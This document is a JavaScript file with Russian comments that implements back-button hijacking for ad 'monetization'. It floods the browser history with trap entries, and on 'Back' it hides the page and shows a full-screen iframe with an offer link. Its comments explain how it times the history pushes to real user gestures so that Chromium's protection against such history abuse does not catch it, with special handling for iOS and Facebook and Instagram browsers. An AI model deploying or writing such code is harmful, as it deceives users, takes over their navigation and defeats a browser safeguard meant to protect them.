(function () {
    'use strict';

    // Публичный вход — как и раньше: vitBack('https://.../offer?sub={sub_id}')
    window.vitBack = function (backLink) {
        backInFrame(backLink);
    };

    function backInFrame(backLink) {
        if (getUrlVar('frame') === '1' || isInIframe()) return;

        // Подставляем {param} из query текущего URL
        var url = new URL(location.href);
        backLink = backLink.replace(/{([^}]*)}/gm, function (all, key) {
            return url.searchParams.has(key) ? url.searchParams.get(key) : '';
        });

        // Скрытый фрейм монетизации — создаём один раз
        var frame = document.createElement('iframe');
        frame.id = 'newsFrame';
        frame.name = 'newsFrame';
        frame.setAttribute('style',
            'position:fixed;top:0;left:0;width:100%;height:100vh;' +
            'border:none;z-index:999997;background:#fff;display:none;');
        (document.body || document.documentElement).appendChild(frame);

        var TRAP_DEPTH = 15;   // сколько записей держим в стеке
        var armed = false;     // ловушка уже установлена под реальным жестом?
        var shown = false;     // монетизацию уже показали?

        function pushTrap() {
            // Пушим ТОЛЬКО находясь в обработчике реального жеста —
            // тогда Chromium НЕ помечает записи как skippable и не пропускает
            // страницу при «Назад».
            for (var i = 0; i < TRAP_DEPTH; i++) {
                try { history.pushState({ EVENT: 'MIXER', i: i }, '', location.href); } catch (e) {}
            }
        }

        function showMonetization() {
            if (shown) return;
            shown = true;
            document.body.style.overflow = 'hidden';
            frame.style.display = 'block';
            var kids = document.querySelectorAll('body > *:not(#newsFrame)');
            for (var k = 0; k < kids.length; k++) {
                kids[k].setAttribute('style', 'display:none;');
            }
            try {
                frames['newsFrame'].location.replace(backLink);
            } catch (e) {
                location.replace(backLink); // фолбэк, если фрейм заблокирован
            }
        }

        window.addEventListener('popstate', function (t) {
            // На iOS state может быть пустым — там всё равно монетизируем.
            // На Chromium срабатываем, пока мы внутри своих записей (t.state есть).
            if (!isIos() && !t.state) {
                // Пользователь выбрал из наших записей — восстановим ловушку
                // (доступна transient activation от самого жеста «Назад»).
                pushTrap();
                return;
            }
            showMonetization();
        });

        if (isIos()) {
            // WebKit: intervention нет, ставим ловушку сразу.
            pushTrap();
        } else {
            // Chromium (Android Chrome, встроенный браузер Facebook/Instagram):
            // записи держатся в back-стеке ТОЛЬКО при наличии реальной
            // пользовательской активации. Ставим ловушку на первый настоящий
            // жест и обновляем sticky-активацию на последующих.
            var arm = function () {
                pushTrap();
                if (armed) return;
                armed = true;
            };
            var opts = { capture: true, passive: true };
            ['pointerdown', 'touchend', 'mousedown', 'keydown', 'click'].forEach(function (ev) {
                window.addEventListener(ev, arm, opts);
            });
            // scroll обрабатываем отдельно и разово, чтобы не спамить pushState
            var onScrollOnce = function () {
                window.removeEventListener('scroll', onScrollOnce, opts);
                arm();
            };
            window.addEventListener('scroll', onScrollOnce, opts);
        }
    }

    function getUrlVar(key) {
        var p = window.location.search;
        p = p.match(new RegExp('[?&]{1}(?:' + key + '=([^&$#=]+))'));
        return p ? p[1] : '';
    }

    function isInIframe() {
        try {
            return window !== window.top || self.location !== top.location;
        } catch (e) {
            return true;
        }
    }

    function isIos() {
        // navigator.platform в 2026 заморожен/устарел — опираемся на UA и touch.
        var ua = navigator.userAgent || '';
        if (/FBIOS|Instagram.*(iPhone|iPad)|iPhone|iPad|iPod/i.test(ua)) return true;
        // iPadOS в desktop-режиме представляется как Mac, но имеет тач:
        if (/Macintosh/i.test(ua) && (navigator.maxTouchPoints || 0) > 1) return true;
        // Легаси-фолбэк:
        return ['iPhone', 'iPad', 'iPod', 'MacIntel']
            .indexOf(navigator.platform) !== -1 && (navigator.maxTouchPoints || 0) > 1;
    }

})(window);
